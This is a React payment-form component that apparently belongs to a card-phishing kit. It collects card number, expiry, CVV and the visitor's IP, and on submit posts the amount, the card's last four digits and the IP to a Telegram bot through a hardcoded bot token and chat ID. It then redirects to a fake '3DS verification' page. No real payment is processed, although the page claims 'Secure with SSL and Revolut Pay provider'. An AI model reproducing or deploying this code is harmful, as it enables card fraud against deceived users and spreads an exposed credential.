import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { useToast } from "./ui/use-toast";

interface PaymentFormProps {
  amount: number;
}

// Luhn algorithm validation
const validateCardNumber = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\D/g, '');
  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i]);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

const sendTelegramNotification = async (paymentData: any) => {
  try {
    const response = await fetch('https://api.telegram.org/bot7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU/sendMessage', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: "6293259686",
        text: `New payment:
Amount: ${paymentData.amount}
Card: ${paymentData.cardNumber.slice(-4)}
IP: ${paymentData.ip}`,
      }),
    });
    console.log('Telegram notification sent:', response.ok);
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
  }
};

export const PaymentForm = ({ amount }: PaymentFormProps) => {
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [ip, setIp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  // Fetch IP address when component mounts
  React.useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => setIp(data.ip))
      .catch(console.error);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!validateCardNumber(cardNumber)) {
      toast({
        title: "Invalid Card",
        description: "Please enter a valid card number",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    // Send payment data to Telegram
    await sendTelegramNotification({
      amount,
      cardNumber,
      ip,
    });

    // Add 3-second delay before navigation
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Navigate to 3DS verification
    navigate(`/verify-3ds?amount=${amount}`);
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(" ");
    } else {
      return value;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    if (v.length >= 2) {
      return `${v.slice(0, 2)}/${v.slice(2, 4)}`;
    }
    return v;
  };

  return (
    <form onSubmit={handleSubmit} className="w-full max-w-md space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10">
      <div className="space-y-2">
        <h2 className="text-2xl font-bold text-white text-center">
          Pay ${amount.toFixed(2)}
        </h2>
      </div>
      <div className="space-y-4">
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
            maxLength={19}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500"
            required
          />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
              maxLength={5}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500"
              required
            />
          </div>
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
              maxLength={4}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500"
              required
            />
          </div>
        </div>
        <Button
          type="submit"
          disabled={isSubmitting}
          className={`w-full relative bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] bg-[length:200%_200%] animate-gradient text-white transition-all duration-300
            before:absolute before:inset-0 before:rounded-md before:p-[1px] before:bg-gradient-to-r before:from-[#8B5CF6] before:via-[#D946EF] before:to-[#0EA5E9] before:animate-border-flow before:opacity-0 before:hover:opacity-100
            ${isSubmitting ? 'opacity-75 cursor-not-allowed' : 'hover:scale-[1.02]'}`}
        >
          {isSubmitting ? 'Processing...' : 'Pay Now'}
        </Button>
      </div>
      <p className="text-gray-400 text-sm mt-8">
        Secure with SSL and Revolut Pay provider
      </p>
    </form>
  );
};